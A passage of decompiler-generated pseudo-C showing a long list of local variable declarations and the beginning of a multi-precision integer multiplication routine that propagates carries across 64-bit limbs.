  _BOOL8 v176; // r9
  unsigned __int128 v177; // rax
  unsigned __int64 v178; // rcx
  unsigned __int64 v179; // r10
  _BOOL8 v180; // r9
  unsigned __int128 v181; // rax
  unsigned __int64 v182; // r8
  unsigned __int64 v183; // r10
  _BOOL8 v184; // r9
  unsigned __int128 v185; // rax
  unsigned __int64 v186; // rcx
  unsigned __int64 v187; // r10
  _BOOL8 v188; // r9
  unsigned __int128 v189; // rax
  unsigned __int64 v190; // r8
  unsigned __int64 v191; // r10
  _BOOL8 v192; // r9
  unsigned __int128 v193; // rax
  unsigned __int64 v194; // rcx
  unsigned __int64 v195; // r10
  _BOOL8 v196; // r9
  unsigned __int128 v197; // rax
  unsigned __int64 v198; // r8
  unsigned __int64 v199; // r10
  _BOOL8 v200; // r9
  unsigned __int128 v201; // rax
  unsigned __int64 v202; // rcx
  unsigned __int64 v203; // r10
  _BOOL8 v204; // r9
  unsigned __int128 v205; // rax
  unsigned __int64 v206; // r10
  _BOOL8 v207; // r9
  unsigned __int128 v208; // rax
  unsigned __int64 v209; // rcx
  unsigned __int64 v210; // r9
  _BOOL8 v211; // r10
  unsigned __int128 v212; // rax
  unsigned __int64 v213; // r8
  unsigned __int64 v214; // r9
  _BOOL8 v215; // r10
  unsigned __int128 v216; // rax
  unsigned __int64 v217; // rcx
  unsigned __int64 v218; // r9
  _BOOL8 v219; // r10
  unsigned __int128 v220; // rax
  unsigned __int64 v221; // r8
  unsigned __int64 v222; // r9
  _BOOL8 v223; // r10
  unsigned __int128 v224; // rax
  unsigned __int64 v225; // rcx
  unsigned __int64 v226; // r9
  _BOOL8 v227; // r10
  unsigned __int128 v228; // rax
  unsigned __int64 v229; // r8
  unsigned __int64 v230; // r9
  _BOOL8 v231; // r10
  unsigned __int128 v232; // rax
  unsigned __int64 v233; // rcx
  unsigned __int64 v234; // r9
  _BOOL8 v235; // r10
  unsigned __int128 v236; // rax
  unsigned __int64 v237; // r8
  unsigned __int64 v238; // r9
  _BOOL8 v239; // r10
  unsigned __int128 v240; // rax
  unsigned __int64 v241; // rcx
  unsigned __int64 v242; // r9
  _BOOL8 v243; // r10
  unsigned __int128 v244; // rax
  unsigned __int64 v245; // r8
  unsigned __int64 v246; // r9
  _BOOL8 v247; // r10
  unsigned __int128 v248; // rax
  unsigned __int64 v249; // r9
  __int64 v250; // r10
  unsigned __int128 v251; // rax
  unsigned __int64 v252; // rcx
  unsigned __int64 v253; // r10
  _BOOL8 v254; // r9
  unsigned __int128 v255; // rax
  unsigned __int64 v256; // r8
  unsigned __int64 v257; // r10
  _BOOL8 v258; // r9
  unsigned __int128 v259; // rax
  unsigned __int64 v260; // rcx
  unsigned __int64 v261; // r10
  _BOOL8 v262; // r9
  unsigned __int128 v263; // rax
  unsigned __int64 v264; // r8
  unsigned __int64 v265; // r10
  _BOOL8 v266; // r9
  unsigned __int128 v267; // rax
  unsigned __int64 v268; // rcx
  unsigned __int64 v269; // r10
  _BOOL8 v270; // r9
  unsigned __int128 v271; // rax
  unsigned __int64 v272; // r8
  unsigned __int64 v273; // r10
  _BOOL8 v274; // r9
  unsigned __int128 v275; // rax
  unsigned __int64 v276; // rcx
  unsigned __int64 v277; // r10
  _BOOL8 v278; // r9
  unsigned __int128 v279; // rax
  unsigned __int64 v280; // r8
  unsigned __int64 v281; // r10
  _BOOL8 v282; // r9
  unsigned __int128 v283; // rax
  unsigned __int64 v284; // rcx
  unsigned __int64 v285; // r10
  _BOOL8 v286; // r9
  unsigned __int128 v287; // rax
  unsigned __int64 v288; // r8
  unsigned __int64 v289; // r10
  _BOOL8 v290; // r9
  unsigned __int128 v291; // rax
  unsigned __int64 v292; // rcx
  unsigned __int64 v293; // r10
  __int64 v294; // r9
  unsigned __int128 v295; // rax
  unsigned __int64 v296; // r10
  __int64 v297; // r9
  unsigned __int128 v298; // rax
  unsigned __int64 v299; // rcx
  unsigned __int64 v300; // r9
  _BOOL8 v301; // r10
  unsigned __int128 v302; // rax
  unsigned __int64 v303; // r8
  unsigned __int64 v304; // r9
  _BOOL8 v305; // r10
  unsigned __int128 v306; // rax
  unsigned __int64 v307; // rcx
  unsigned __int64 v308; // r9
  _BOOL8 v309; // r10
  unsigned __int128 v310; // rax
  unsigned __int64 v311; // r8
  unsigned __int64 v312; // r9
  _BOOL8 v313; // r10
  unsigned __int128 v314; // rax
  unsigned __int64 v315; // rcx
  unsigned __int64 v316; // r9
  _BOOL8 v317; // r10
  unsigned __int128 v318; // rax
  unsigned __int64 v319; // r8
  unsigned __int64 v320; // r9
  _BOOL8 v321; // r10
  unsigned __int128 v322; // rax
  unsigned __int64 v323; // rcx
  unsigned __int64 v324; // r9
  _BOOL8 v325; // r10
  unsigned __int128 v326; // rax
  unsigned __int64 v327; // r8
  unsigned __int64 v328; // r9
  _BOOL8 v329; // r10
  unsigned __int128 v330; // rax
  unsigned __int64 v331; // rcx
  unsigned __int64 v332; // r9
  _BOOL8 v333; // r10
  unsigned __int128 v334; // rax
  unsigned __int64 v335; // r8
  unsigned __int64 v336; // r9
  _BOOL8 v337; // r10
  unsigned __int128 v338; // rax
  unsigned __int64 v339; // rcx
  unsigned __int64 v340; // r9
  __int64 v341; // r10
  unsigned __int128 v342; // rax
  unsigned __int64 v343; // r8
  unsigned __int64 v344; // r9
  __int64 v345; // r10
  unsigned __int128 v346; // rax
  unsigned __int64 v347; // r9
  __int64 v348; // r10
  unsigned __int128 v349; // rax
  unsigned __int64 v350; // rcx
  unsigned __int64 v351; // r10
  _BOOL8 v352; // r9
  unsigned __int128 v353; // rax
  unsigned __int64 v354; // r8
  unsigned __int64 v355; // r10
  _BOOL8 v356; // r9
  unsigned __int128 v357; // rax
  unsigned __int64 v358; // rcx
  unsigned __int64 v359; // r10
  _BOOL8 v360; // r9
  unsigned __int128 v361; // rax
  unsigned __int64 v362; // r8
  unsigned __int64 v363; // r10
  _BOOL8 v364; // r9
  unsigned __int128 v365; // rax
  unsigned __int64 v366; // rcx
  unsigned __int64 v367; // r10
  _BOOL8 v368; // r9
  unsigned __int128 v369; // rax
  unsigned __int64 v370; // r8
  unsigned __int64 v371; // r10
  _BOOL8 v372; // r9
  unsigned __int128 v373; // rax
  unsigned __int64 v374; // rcx
  unsigned __int64 v375; // r10
  _BOOL8 v376; // r9
  unsigned __int128 v377; // rax
  unsigned __int64 v378; // r8
  unsigned __int64 v379; // r10
  _BOOL8 v380; // r9
  unsigned __int128 v381; // rax
  unsigned __int64 v382; // rcx
  unsigned __int64 v383; // r10
  _BOOL8 v384; // r9
  unsigned __int128 v385; // rax
  unsigned __int64 v386; // r8
  unsigned __int64 v387; // r10
  _BOOL8 v388; // r9
  unsigned __int128 v389; // rax
  unsigned __int64 v390; // rcx
  unsigned __int64 v391; // r10
  __int64 v392; // r9
  unsigned __int128 v393; // rax
  unsigned __int64 v394; // r8
  unsigned __int64 v395; // r10
  __int64 v396; // r9
  unsigned __int128 v397; // rax
  unsigned __int64 v398; // rcx
  unsigned __int64 v399; // r10
  __int64 v400; // r9
  unsigned __int128 v401; // rax
  unsigned __int64 v402; // r10
  __int64 v403; // r9
  unsigned __int128 v404; // rax
  unsigned __int64 v405; // rcx
  unsigned __int64 v406; // r9
  _BOOL8 v407; // r11
  unsigned __int128 v408; // rax
  unsigned __int64 v409; // r8
  unsigned __int64 v410; // r9
  _BOOL8 v411; // r11
  unsigned __int128 v412; // rax
  unsigned __int64 v413; // rcx
  unsigned __int64 v414; // r9
  _BOOL8 v415; // r11
  unsigned __int128 v416; // rax
  unsigned __int64 v417; // r8
  unsigned __int64 v418; // r9
  _BOOL8 v419; // r11
  unsigned __int128 v420; // rax
  unsigned __int64 v421; // rcx
  unsigned __int64 v422; // r9
  _BOOL8 v423; // r11
  unsigned __int128 v424; // rax
  unsigned __int64 v425; // r8
  unsigned __int64 v426; // r9
  _BOOL8 v427; // r11
  unsigned __int128 v428; // rax
  unsigned __int64 v429; // rcx
  unsigned __int64 v430; // r9
  _BOOL8 v431; // r11
  unsigned __int128 v432; // rax
  unsigned __int64 v433; // r8
  unsigned __int64 v434; // r9
  _BOOL8 v435; // r11
  unsigned __int128 v436; // rax
  unsigned __int64 v437; // rcx
  unsigned __int64 v438; // r9
  _BOOL8 v439; // r11
  unsigned __int128 v440; // rax
  unsigned __int64 v441; // r8
  unsigned __int64 v442; // r9
  _BOOL8 v443; // r11
  unsigned __int128 v444; // rax
  unsigned __int64 v445; // rcx
  unsigned __int64 v446; // r9
  __int64 v447; // r11
  unsigned __int128 v448; // rax
  unsigned __int64 v449; // r8
  unsigned __int64 v450; // r9
  __int64 v451; // r11
  unsigned __int128 v452; // rax
  unsigned __int64 v453; // rcx
  unsigned __int64 v454; // r9
  __int64 v455; // r11
  unsigned __int128 v456; // rax
  unsigned __int64 v457; // r8
  unsigned __int64 v458; // r9
  __int64 v459; // r11
  unsigned __int128 v460; // rax
  unsigned __int64 v461; // r9
  __int64 v462; // r11
  unsigned __int128 v463; // rax
  unsigned __int64 v464; // rcx
  unsigned __int64 v465; // r11
  _BOOL8 v466; // r10
  unsigned __int128 v467; // rax
  unsigned __int64 v468; // r8
  unsigned __int64 v469; // r11
  _BOOL8 v470; // r10
  unsigned __int128 v471; // rax
  unsigned __int64 v472; // rcx
  unsigned __int64 v473; // r11
  _BOOL8 v474; // r10
  unsigned __int128 v475; // rax
  unsigned __int64 v476; // r8
  unsigned __int64 v477; // r11
  _BOOL8 v478; // r10
  unsigned __int128 v479; // rax
  unsigned __int64 v480; // rcx
  unsigned __int64 v481; // r11
  _BOOL8 v482; // r10
  unsigned __int128 v483; // rax
  unsigned __int64 v484; // r8
  unsigned __int64 v485; // r11
  _BOOL8 v486; // r10
  unsigned __int128 v487; // rax
  unsigned __int64 v488; // rcx
  unsigned __int64 v489; // r11
  _BOOL8 v490; // r10
  unsigned __int128 v491; // rax
  unsigned __int64 v492; // r8
  unsigned __int64 v493; // r11
  _BOOL8 v494; // r10
  unsigned __int128 v495; // rax
  unsigned __int64 v496; // rcx
  unsigned __int64 v497; // r11
  _BOOL8 v498; // r10
  unsigned __int128 v499; // rax
  unsigned __int64 v500; // r8
  unsigned __int64 v501; // r11
  _BOOL8 v502; // r10
  unsigned __int128 v503; // rax
  unsigned __int64 v504; // rcx
  unsigned __int64 v505; // r11
  __int64 v506; // r10
  unsigned __int128 v507; // rax
  unsigned __int64 v508; // r8
  unsigned __int64 v509; // r11
  __int64 v510; // r10
  unsigned __int128 v511; // rax
  unsigned __int64 v512; // rcx
  unsigned __int64 v513; // r11
  __int64 v514; // r10
  unsigned __int128 v515; // rax
  unsigned __int64 v516; // r8
  unsigned __int64 v517; // r11
  __int64 v518; // r10
  unsigned __int128 v519; // rax
  unsigned __int64 v520; // rcx
  unsigned __int64 v521; // r11
  __int64 v522; // r10
  unsigned __int128 v523; // rax
  unsigned __int64 v524; // r11
  __int64 v525; // r10
  unsigned __int128 v526; // rax
  unsigned __int64 v527; // rcx
  unsigned __int64 v528; // r10
  _BOOL8 v529; // r9
  unsigned __int128 v530; // rax
  unsigned __int64 v531; // r8
  unsigned __int64 v532; // r10
  _BOOL8 v533; // r9
  unsigned __int128 v534; // rax
  unsigned __int64 v535; // rcx
  unsigned __int64 v536; // r10
  _BOOL8 v537; // r9
  unsigned __int128 v538; // rax
  unsigned __int64 v539; // r8
  unsigned __int64 v540; // r10
  _BOOL8 v541; // r9
  unsigned __int128 v542; // rax
  unsigned __int64 v543; // rcx
  unsigned __int64 v544; // r10
  _BOOL8 v545; // r9
  unsigned __int128 v546; // rax
  unsigned __int64 v547; // r8
  unsigned __int64 v548; // r10
  _BOOL8 v549; // r9
  unsigned __int128 v550; // rax
  unsigned __int64 v551; // rcx
  unsigned __int64 v552; // r10
  _BOOL8 v553; // r9
  unsigned __int128 v554; // rax
  unsigned __int64 v555; // r8
  unsigned __int64 v556; // r10
  _BOOL8 v557; // r9
  unsigned __int128 v558; // rax
  unsigned __int64 v559; // rcx
  unsigned __int64 v560; // r10
  _BOOL8 v561; // r9
  unsigned __int128 v562; // rax
  unsigned __int64 v563; // r8
  unsigned __int64 v564; // r10
  _BOOL8 v565; // r9
  unsigned __int128 v566; // rax
  unsigned __int64 v567; // rcx
  unsigned __int64 v568; // r10
  __int64 v569; // r9
  unsigned __int128 v570; // rax
  unsigned __int64 v571; // r8
  unsigned __int64 v572; // r10
  __int64 v573; // r9
  unsigned __int128 v574; // rax
  unsigned __int64 v575; // rcx
  unsigned __int64 v576; // r10
  __int64 v577; // r9
  unsigned __int128 v578; // rax
  unsigned __int64 v579; // r8
  unsigned __int64 v580; // r10
  __int64 v581; // r9
  unsigned __int128 v582; // rax
  unsigned __int64 v583; // r10
  __int64 v584; // r9
  unsigned __int128 v585; // rax
  unsigned __int64 v586; // rcx
  unsigned __int64 v587; // r9
  _BOOL8 v588; // r10
  unsigned __int128 v589; // rax
  unsigned __int64 v590; // r8
  unsigned __int64 v591; // r9
  _BOOL8 v592; // r10
  unsigned __int128 v593; // rax
  unsigned __int64 v594; // rcx
  unsigned __int64 v595; // r9
  _BOOL8 v596; // r10
  unsigned __int128 v597; // rax
  unsigned __int64 v598; // r8
  unsigned __int64 v599; // r9
  _BOOL8 v600; // r10
  unsigned __int128 v601; // rax
  unsigned __int64 v602; // rcx
  unsigned __int64 v603; // r9
  _BOOL8 v604; // r10
  unsigned __int128 v605; // rax
  unsigned __int64 v606; // r8
  unsigned __int64 v607; // r9
  _BOOL8 v608; // r10
  unsigned __int128 v609; // rax
  unsigned __int64 v610; // rcx
  unsigned __int64 v611; // r9
  _BOOL8 v612; // r10
  unsigned __int128 v613; // rax
  unsigned __int64 v614; // r8
  unsigned __int64 v615; // r9
  _BOOL8 v616; // r10
  unsigned __int128 v617; // rax
  unsigned __int64 v618; // rcx
  unsigned __int64 v619; // r9
  _BOOL8 v620; // r10
  unsigned __int128 v621; // rax
  unsigned __int64 v622; // r8
  unsigned __int64 v623; // r9
  _BOOL8 v624; // r10
  unsigned __int128 v625; // rax
  unsigned __int64 v626; // rcx
  unsigned __int64 v627; // r9
  __int64 v628; // r10
  unsigned __int128 v629; // rax
  unsigned __int64 v630; // r8
  unsigned __int64 v631; // r9
  __int64 v632; // r10
  unsigned __int128 v633; // rax
  unsigned __int64 v634; // rcx
  unsigned __int64 v635; // r9
  __int64 v636; // r10
  unsigned __int128 v637; // rax
  unsigned __int64 v638; // r9
  __int64 v639; // r10
  unsigned __int128 v640; // rax
  unsigned __int64 v641; // rcx
  unsigned __int64 v642; // r10
  _BOOL8 v643; // r9
  unsigned __int128 v644; // rax
  unsigned __int64 v645; // r8
  unsigned __int64 v646; // r10
  _BOOL8 v647; // r9
  unsigned __int128 v648; // rax
  unsigned __int64 v649; // rcx
  unsigned __int64 v650; // r10
  _BOOL8 v651; // r9
  unsigned __int128 v652; // rax
  unsigned __int64 v653; // r8
  unsigned __int64 v654; // r10
  _BOOL8 v655; // r9
  unsigned __int128 v656; // rax
  unsigned __int64 v657; // rcx
  unsigned __int64 v658; // r10
  _BOOL8 v659; // r9
  unsigned __int128 v660; // rax
  unsigned __int64 v661; // r8
  unsigned __int64 v662; // r10
  _BOOL8 v663; // r9
  unsigned __int128 v664; // rax
  unsigned __int64 v665; // rcx
  unsigned __int64 v666; // r10
  _BOOL8 v667; // r9
  unsigned __int128 v668; // rax
  unsigned __int64 v669; // r8
  unsigned __int64 v670; // r10
  _BOOL8 v671; // r9
  unsigned __int128 v672; // rax
  unsigned __int64 v673; // rcx
  unsigned __int64 v674; // r10
  _BOOL8 v675; // r9
  unsigned __int128 v676; // rax
  unsigned __int64 v677; // r8
  unsigned __int64 v678; // r10
  _BOOL8 v679; // r9
  unsigned __int128 v680; // rax
  unsigned __int64 v681; // rcx
  unsigned __int64 v682; // r10
  __int64 v683; // r9
  unsigned __int128 v684; // rax
  unsigned __int64 v685; // r8
  unsigned __int64 v686; // r10
  __int64 v687; // r9
  unsigned __int128 v688; // rax
  unsigned __int64 v689; // r10
  __int64 v690; // r9
  unsigned __int128 v691; // rax
  unsigned __int64 v692; // rcx
  unsigned __int64 v693; // r9
  _BOOL8 v694; // r10
  unsigned __int128 v695; // rax
  unsigned __int64 v696; // r8
  unsigned __int64 v697; // r9
  _BOOL8 v698; // r10
  unsigned __int128 v699; // rax
  unsigned __int64 v700; // rcx
  unsigned __int64 v701; // r9
  _BOOL8 v702; // r10
  unsigned __int128 v703; // rax
  unsigned __int64 v704; // r8
  unsigned __int64 v705; // r9
  _BOOL8 v706; // r10
  unsigned __int128 v707; // rax
  unsigned __int64 v708; // rcx
  unsigned __int64 v709; // r9
  _BOOL8 v710; // r10
  unsigned __int128 v711; // rax
  unsigned __int64 v712; // r8
  unsigned __int64 v713; // r9
  _BOOL8 v714; // r10
  unsigned __int128 v715; // rax
  unsigned __int64 v716; // rcx
  unsigned __int64 v717; // r9
  _BOOL8 v718; // r10
  unsigned __int128 v719; // rax
  unsigned __int64 v720; // r8
  unsigned __int64 v721; // r9
  _BOOL8 v722; // r10
  unsigned __int128 v723; // rax
  unsigned __int64 v724; // rcx
  unsigned __int64 v725; // r9
  _BOOL8 v726; // r10
  unsigned __int128 v727; // rax
  unsigned __int64 v728; // r8
  unsigned __int64 v729; // r9
  _BOOL8 v730; // r10
  unsigned __int128 v731; // rax
  unsigned __int64 v732; // rcx
  unsigned __int64 v733; // r9
  __int64 v734; // r10
  unsigned __int128 v735; // rax
  unsigned __int64 v736; // r9
  __int64 v737; // r10
  unsigned __int128 v738; // rax
  unsigned __int64 v739; // rcx
  unsigned __int64 v740; // r10
  _BOOL8 v741; // r9
  unsigned __int128 v742; // rax
  unsigned __int64 v743; // r8
  unsigned __int64 v744; // r10
  _BOOL8 v745; // r9
  unsigned __int128 v746; // rax
  unsigned __int64 v747; // rcx
  unsigned __int64 v748; // r10
  _BOOL8 v749; // r9
  unsigned __int128 v750; // rax
  unsigned __int64 v751; // r8
  unsigned __int64 v752; // r10
  _BOOL8 v753; // r9
  unsigned __int128 v754; // rax
  unsigned __int64 v755; // rcx
  unsigned __int64 v756; // r10
  _BOOL8 v757; // r9
  unsigned __int128 v758; // rax
  unsigned __int64 v759; // r8
  unsigned __int64 v760; // r10
  _BOOL8 v761; // r9
  unsigned __int128 v762; // rax
  unsigned __int64 v763; // rcx
  unsigned __int64 v764; // r10
  _BOOL8 v765; // r9
  unsigned __int128 v766; // rax
  unsigned __int64 v767; // r8
  unsigned __int64 v768; // r10
  _BOOL8 v769; // r9
  unsigned __int128 v770; // rax
  unsigned __int64 v771; // rcx
  unsigned __int64 v772; // r10
  _BOOL8 v773; // r9
  unsigned __int128 v774; // rax
  unsigned __int64 v775; // r8
  unsigned __int64 v776; // r10
  _BOOL8 v777; // r9
  unsigned __int128 v778; // rax
  unsigned __int64 v779; // r10
  __int64 v780; // r9
  unsigned __int128 v781; // rax
  unsigned __int64 v782; // rcx
  unsigned __int64 v783; // r9
  _BOOL8 v784; // r10
  unsigned __int128 v785; // rax
  unsigned __int64 v786; // r8
  unsigned __int64 v787; // r9
  _BOOL8 v788; // r10
  unsigned __int128 v789; // rax
  unsigned __int64 v790; // rcx
  unsigned __int64 v791; // r9
  _BOOL8 v792; // r10
  unsigned __int128 v793; // rax
  unsigned __int64 v794; // r8
  unsigned __int64 v795; // r9
  _BOOL8 v796; // r10
  unsigned __int128 v797; // rax
  unsigned __int64 v798; // rcx
  unsigned __int64 v799; // r9
  _BOOL8 v800; // r10
  unsigned __int128 v801; // rax
  unsigned __int64 v802; // r8
  unsigned __int64 v803; // r9
  _BOOL8 v804; // r10
  unsigned __int128 v805; // rax
  unsigned __int64 v806; // rcx
  unsigned __int64 v807; // r9
  _BOOL8 v808; // r10
  unsigned __int128 v809; // rax
  unsigned __int64 v810; // r8
  unsigned __int64 v811; // r9
  _BOOL8 v812; // r10
  unsigned __int128 v813; // rax
  unsigned __int64 v814; // rcx
  unsigned __int64 v815; // r9
  _BOOL8 v816; // r10
  unsigned __int128 v817; // rax
  unsigned __int64 v818; // r9
  _BOOL8 v819; // r10
  unsigned __int128 v820; // rax
  unsigned __int64 v821; // rcx
  unsigned __int64 v822; // r10
  _BOOL8 v823; // r9
  unsigned __int128 v824; // rax
  unsigned __int64 v825; // r8
  unsigned __int64 v826; // r10
  _BOOL8 v827; // r9
  unsigned __int128 v828; // rax
  unsigned __int64 v829; // rcx
  unsigned __int64 v830; // r10
  _BOOL8 v831; // r9
  unsigned __int128 v832; // rax
  unsigned __int64 v833; // r8
  unsigned __int64 v834; // r10
  _BOOL8 v835; // r9
  unsigned __int128 v836; // rax
  unsigned __int64 v837; // rcx
  unsigned __int64 v838; // r10
  _BOOL8 v839; // r9
  unsigned __int128 v840; // rax
  unsigned __int64 v841; // r8
  unsigned __int64 v842; // r10
  _BOOL8 v843; // r9
  unsigned __int128 v844; // rax
  unsigned __int64 v845; // rcx
  unsigned __int64 v846; // r10
  _BOOL8 v847; // r9
  unsigned __int128 v848; // rax
  unsigned __int64 v849; // r8
  unsigned __int64 v850; // r10
  _BOOL8 v851; // r9
  unsigned __int128 v852; // rax
  unsigned __int64 v853; // r10
  _BOOL8 v854; // r9
  unsigned __int128 v855; // rax
  unsigned __int64 v856; // rcx
  unsigned __int64 v857; // r9
  _BOOL8 v858; // r10
  unsigned __int128 v859; // rax
  unsigned __int64 v860; // r8
  unsigned __int64 v861; // r9
  _BOOL8 v862; // r10
  unsigned __int128 v863; // rax
  unsigned __int64 v864; // rcx
  unsigned __int64 v865; // r9
  _BOOL8 v866; // r10
  unsigned __int128 v867; // rax
  unsigned __int64 v868; // r8
  unsigned __int64 v869; // r9
  _BOOL8 v870; // r10
  unsigned __int128 v871; // rax
  unsigned __int64 v872; // rcx
  unsigned __int64 v873; // r9
  _BOOL8 v874; // r10
  unsigned __int128 v875; // rax
  unsigned __int64 v876; // r8
  unsigned __int64 v877; // r9
  _BOOL8 v878; // r10
  unsigned __int128 v879; // rax
  unsigned __int64 v880; // rcx
  unsigned __int64 v881; // r9
  _BOOL8 v882; // r10
  unsigned __int128 v883; // rax
  unsigned __int64 v884; // r9
  _BOOL8 v885; // r10
  unsigned __int128 v886; // rax
  unsigned __int64 v887; // rcx
  unsigned __int64 v888; // r10
  _BOOL8 v889; // r9
  unsigned __int128 v890; // rax
  unsigned __int64 v891; // r8
  unsigned __int64 v892; // r10
  _BOOL8 v893; // r9
  unsigned __int128 v894; // rax
  unsigned __int64 v895; // rcx
  unsigned __int64 v896; // r10
  _BOOL8 v897; // r9
  unsigned __int128 v898; // rax
  unsigned __int64 v899; // r8
  unsigned __int64 v900; // r10
  _BOOL8 v901; // r9
  unsigned __int128 v902; // rax
  unsigned __int64 v903; // rcx
  unsigned __int64 v904; // r10
  _BOOL8 v905; // r9
  unsigned __int128 v906; // rax
  unsigned __int64 v907; // r8
  unsigned __int64 v908; // r10
  _BOOL8 v909; // r9
  unsigned __int128 v910; // rax
  unsigned __int64 v911; // r10
  _BOOL8 v912; // r9
  unsigned __int128 v913; // rax
  unsigned __int64 v914; // rcx
  unsigned __int64 v915; // r9
  _BOOL8 v916; // r10
  unsigned __int128 v917; // rax
  unsigned __int64 v918; // r8
  unsigned __int64 v919; // r9
  _BOOL8 v920; // r10
  unsigned __int128 v921; // rax
  unsigned __int64 v922; // rcx
  unsigned __int64 v923; // r9
  _BOOL8 v924; // r10
  unsigned __int128 v925; // rax
  unsigned __int64 v926; // r8
  unsigned __int64 v927; // r9
  _BOOL8 v928; // r10
  unsigned __int128 v929; // rax
  unsigned __int64 v930; // rcx
  unsigned __int64 v931; // r9
  _BOOL8 v932; // r10
  unsigned __int128 v933; // rax
  unsigned __int64 v934; // r9
  _BOOL8 v935; // r10
  unsigned __int128 v936; // rax
  unsigned __int64 v937; // rcx
  unsigned __int64 v938; // r10
  _BOOL8 v939; // r9
  unsigned __int128 v940; // rax
  unsigned __int64 v941; // r8
  unsigned __int64 v942; // r10
  _BOOL8 v943; // r9
  unsigned __int128 v944; // rax
  unsigned __int64 v945; // rcx
  unsigned __int64 v946; // r10
  _BOOL8 v947; // r9
  unsigned __int128 v948; // rax
  unsigned __int64 v949; // r8
  unsigned __int64 v950; // r10
  _BOOL8 v951; // r9
  unsigned __int128 v952; // rax
  unsigned __int64 v953; // r10
  _BOOL8 v954; // r9
  unsigned __int128 v955; // rax
  unsigned __int64 v956; // rcx
  unsigned __int64 v957; // r9
  _BOOL8 v958; // r10
  unsigned __int128 v959; // rax
  unsigned __int64 v960; // r8
  unsigned __int64 v961; // r9
  _BOOL8 v962; // r10
  unsigned __int128 v963; // rax
  unsigned __int64 v964; // rcx
  unsigned __int64 v965; // r9
  _BOOL8 v966; // r10
  unsigned __int128 v967; // rax
  unsigned __int64 v968; // r9
  _BOOL8 v969; // r10
  unsigned __int128 v970; // rax
  unsigned __int64 v971; // rcx
  unsigned __int64 v972; // r10
  _BOOL8 v973; // r9
  unsigned __int128 v974; // rax
  unsigned __int64 v975; // r8
  unsigned __int64 v976; // r10
  _BOOL8 v977; // r9
  unsigned __int128 v978; // rax
  unsigned __int64 v979; // r10
  _BOOL8 v980; // r9
  unsigned __int128 v981; // rax
  unsigned __int64 v982; // rcx
  unsigned __int64 v983; // r9
  _BOOL8 v984; // r8
  unsigned __int128 v985; // rax
  unsigned __int64 v986; // r9
  _BOOL8 v987; // r8
  unsigned __int128 v988; // rax
  unsigned __int64 result; // rax

  v6 = *a3;
  v7 = *a2;
  *a1 = *a2 * *a3;
  v8 = (*a2 * (unsigned __int128)a3[1]) >> 64;
  v9 = (__PAIR128__(a3[1], v6) * v7) >> 64;
  v10 = v9 + a2[1] * *a3;
  v11 = (a2[1] * (unsigned __int128)*a3) >> 64;
  a1[1] = v10;
  v12 = (v10 < v9) + v11;
  v13 = v12 + (v9 < (unsigned __int128)(v7 * v6) >> 64) + v8;
  v14 = v13 + *a2 * a3[2];
  v15 = (v14 < v13) + ((*a2 * (unsigned __int128)a3[2]) >> 64);
  v16 = (v13 < v12) + v15;
  v17 = v14 + a2[1] * a3[1];
  v18 = (v17 < v14) + ((a2[1] * (unsigned __int128)a3[1]) >> 64);
  v19 = v17 + a2[2] * *a3;
  v20 = (a2[2] * (unsigned __int128)*a3) >> 64;
  a1[2] = v19;
  v21 = (v19 < v17) + v20;
  v22 = v16 + v18 + v21;
  v23 = v22 + *a2 * a3[3];
  v24 = (v23 < v22) + ((*a2 * (unsigned __int128)a3[3]) >> 64);
  v25 = (v22 < v21) + v24 + (v16 < v15) + (unsigned __int64)(v16 + v18 < v18);
  v26 = v23 + a2[1] * a3[2];
  v27 = (v26 < v23) + ((a2[1] * (unsigned __int128)a3[2]) >> 64);
  v28 = v26 + a2[2] * a3[1];
  v29 = (v28 < v26) + ((a2[2] * (unsigned __int128)a3[1]) >> 64);
  v30 = v25 + v27 + v29;
  v31 = v28 + a2[3] * *a3;
  v32 = (a2[3] * (unsigned __int128)*a3) >> 64;
  a1[3] = v31;
  v33 = (v31 < v28) + v32;
  v34 = *a2 * (unsigned __int128)a3[4];
  v35 = v30 + v33 + v34;
  *((_QWORD *)&v34 + 1) += v35 < v30 + v33;
  v36 = (v30 < v29) + (unsigned __int64)(v25 + v27 < v27) + (v30 + v33 < v33) + (v25 < v24) + *((_QWORD *)&v34 + 1);
  v37 = v36 < *((_QWORD *)&v34 + 1);
  v38 = a2[1] * (unsigned __int128)a3[3];
  v39 = v35 + v38;
  *((_QWORD *)&v38 + 1) += v35 + (unsigned __int64)v38 < v35;
  v40 = *((_QWORD *)&v38 + 1) + v36;
  v41 = (*((_QWORD *)&v38 + 1) + v36 < *((_QWORD *)&v38 + 1)) + v37;
  v42 = a2[2] * (unsigned __int128)a3[2];
  v43 = v39 + v42;
  *((_QWORD *)&v42 + 1) += v39 + (unsigned __int64)v42 < v39;
  v44 = *((_QWORD *)&v42 + 1) + v40;
  v45 = (*((_QWORD *)&v42 + 1) + v40 < *((_QWORD *)&v42 + 1)) + v41;
  v46 = a2[3] * (unsigned __int128)a3[1];
  v47 = v43 + v46;
  *((_QWORD *)&v46 + 1) += v43 + (unsigned __int64)v46 < v43;
  v48 = *((_QWORD *)&v46 + 1) + v44;
  v49 = (v48 < *((_QWORD *)&v46 + 1)) + v45;
  v50 = a2[4] * (unsigned __int128)*a3;
  *(_QWORD *)&v50 = v47 + v50;
  a1[4] = v50;
  *((_QWORD *)&v50 + 1) += (unsigned __int64)v50 < v47;
  v51 = *((_QWORD *)&v50 + 1) + v48;
  v52 = (v51 < *((_QWORD *)&v50 + 1)) + v49;
  v53 = *a2 * (unsigned __int128)a3[5];
  v54 = v51 + v53;
  *((_QWORD *)&v53 + 1) += v51 + (unsigned __int64)v53 < v51;
  v55 = *((_QWORD *)&v53 + 1) + v52;
  v56 = v55 < *((_QWORD *)&v53 + 1);
  v57 = a2[1] * (unsigned __int128)a3[4];
  v58 = v54 + v57;
  *((_QWORD *)&v57 + 1) += v54 + (unsigned __int64)v57 < v54;
  v59 = *((_QWORD *)&v57 + 1) + v55;
  v60 = (v59 < *((_QWORD *)&v57 + 1)) + v56;
  v61 = a2[2] * (unsigned __int128)a3[3];
  v62 = v58 + v61;
  *((_QWORD *)&v61 + 1) += v58 + (unsigned __int64)v61 < v58;
  v63 = *((_QWORD *)&v61 + 1) + v59;
  v64 = (v63 < *((_QWORD *)&v61 + 1)) + v60;
  v65 = a2[3] * (unsigned __int128)a3[2];
  v66 = v62 + v65;
  *((_QWORD *)&v65 + 1) += v62 + (unsigned __int64)v65 < v62;
  v67 = *((_QWORD *)&v65 + 1) + v63;
  v68 = (v67 < *((_QWORD *)&v65 + 1)) + v64;
  v69 = a2[4] * (unsigned __int128)a3[1];
  v70 = v66 + v69;
